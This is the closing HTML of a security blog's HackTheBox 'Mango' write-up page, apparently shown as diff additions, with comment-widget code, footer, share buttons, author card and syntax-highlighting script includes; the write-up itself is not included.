+    <script type="text/javascript">
+      var disqus_config = function() {
+        this.page.url = 'https:\/\/succurity.com\/post\/write-ups\/htb-mango\/';
+        
+          this.page.identifier = '\/post\/write-ups\/htb-mango\/'
+        
+      };
+      (function() {
+        
+        
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+          document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+          return;
+        }
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = '';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+    </script>
+  
+
+
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2022 <a href="https://twitter.com/misusage_">Sage</a>. Made with <3. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://succurity.com/post/offsec/pentesting-field-guide/" data-tooltip="Pentesting Field Guide" aria-label="NEXT: Pentesting Field Guide">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://succurity.com/post/offsec/intro-to-buffer-overflows/" data-tooltip="Intro to Buffer Overflows" aria-label="PREVIOUS: Intro to Buffer Overflows">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Share this post">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://succurity.com/post/write-ups/htb-mango/" title="Share on Facebook" aria-label="Share on Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://succurity.com/post/write-ups/htb-mango/" title="Share on Twitter" aria-label="Share on Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://wa.me/?text=https://succurity.com/post/write-ups/htb-mango/" title="Share on Whatsapp" aria-label="Share on Whatsapp">
+          <i class="fab fa-whatsapp" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://succurity.com/post/write-ups/htb-mango/" title="Share on Linkedin" aria-label="Share on Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://news.ycombinator.com/submitlink?u=https://succurity.com/post/write-ups/htb-mango/" title="Share on Hacker News" aria-label="Share on Hacker News">
+          <i class="fab fa-hacker-news" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="Back to top">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+      </div>
+      
+<div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-times"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsuccurity.com%2Fpost%2Fwrite-ups%2Fhtb-mango%2F" aria-label="Share on Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i><span>Share on Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fsuccurity.com%2Fpost%2Fwrite-ups%2Fhtb-mango%2F" aria-label="Share on Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i><span>Share on Twitter</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://wa.me/?text=https%3A%2F%2Fsuccurity.com%2Fpost%2Fwrite-ups%2Fhtb-mango%2F" aria-label="Share on Whatsapp">
+          <i class="fab fa-whatsapp" aria-hidden="true"></i><span>Share on Whatsapp</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fsuccurity.com%2Fpost%2Fwrite-ups%2Fhtb-mango%2F" aria-label="Share on Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i><span>Share on Linkedin</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://news.ycombinator.com/submitlink?u=https%3A%2F%2Fsuccurity.com%2Fpost%2Fwrite-ups%2Fhtb-mango%2F" aria-label="Share on Hacker News">
+          <i class="fab fa-hacker-news" aria-hidden="true"></i><span>Share on Hacker News</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+
+
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-times"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://succurity.com/images/me.jpg" alt="Author&#39;s picture" />
+    
+    <h4 id="about-card-name">Sage</h4>
+    
+      <div id="about-card-bio">Succurity through Obscurity usually isn&rsquo;t a good idea.</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Offensive Security
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker-alt"></i>
+        <br/>
+        California, US
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      
+      <div id="cover" style="background-image:url('https://succurity.com/images/cover.jpg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/highlight.min.js" integrity="sha512-z+/WWfyD5tccCukM4VvONpEtLmbAm5LDu7eKiyMQJ9m7OfPEDL7gENyDRL3Yfe8XAuGsS2fS4xSMnl6d30kqGQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha512-uURl+ZXMBrF4AwGaWmEetzrd+J5/8NRkWAvJx5sbPSSuOb0bZLqf+tOzniObO00BjHa/dD7gub9oCGMLPQHtQA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+
+<script src="https://succurity.com/js/script-yqzy9wdlzix4lbbwdnzvwx3egsne77earqmn73v9uno8aupuph8wfguccut.min.js"></script>
+
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-gE8KAQyFIzV1C9+GZ8TKJHZS2s+n7EjNtC+IMRn1l5+WYJTHOODUM6JSjZhFhqXmc7bG8Av6XXpckA4tYhflnw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/apache.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-EWROca+bote+7Oaaar1F6y74iZj1r1F9rm/ly7o+/FwJopbBaWtsFDmaKoZDd3QiGU2pGacBirHJNivmGLYrow==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/go.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-GDVzAn0wpx1yVtQsRWmFc6PhJiLBPdUic+h4GWgljBh904O3JU10fk9EKNpVyIoPqkFn54rgL2QBG4BmUTMpiQ==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/http.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-UgZlma8NzkrDb/NWgmLIcTrH7i/CSnLLDRFqCSNF5NGPpjKmzyM25qcoXGOup8+cDakKyaiTDd7N4dyH4YT+IA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/less.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-lot9koe73sfXIrUvIPM/UEhuMciN56RPyBdOyZgfO53P2lkWyyXN7J+njcxIIBRV+nVDQeiWtiXg+bLAJZDTfg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/nginx.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-Zd3e7XxHP00TD0Imr0PIfeM0fl0v95kMWuhyAS3Wn1UTSXTkz0OhtRgBAr4JlmADRgiXr4x7lpeUdqaGN8xIog==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/puppet.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-qtqDO052iXMSP+5d/aE/jMtL9vIIGvONgTJziC2K/ZIB1yEGa55WVxGE9/08rSQ62EoDifS9SWVGZ7ihSLhzMA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/scss.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-1NmkjnEDnwwwcu28KoQF8vs3oaPFokQHbmbtwGhFfeDsQZtVFI8zW2aE9O8yMYdpdyKV/5blE4pSWw4Z/Sv97w==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/stylus.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-B2wSfruPjr8EJL6IIzQr1eAuDwrsfIfccNf/LCEdxELCgC/S/ZMt/Uvk80aD79m7IqOqW+Sw8nbkvha20yZpzg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/swift.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-28oDiQZGKUVN6wQ7PSLPNipOcmkCALXKwOi7bnkyFf8QiMZQxG9EQoy/iiNx6Zxj2cG2SbVa4dXKigQhu7GiFw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/yaml.min.js"></script>
+  
+
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+
+
+    
+  </body>
+</html>
+
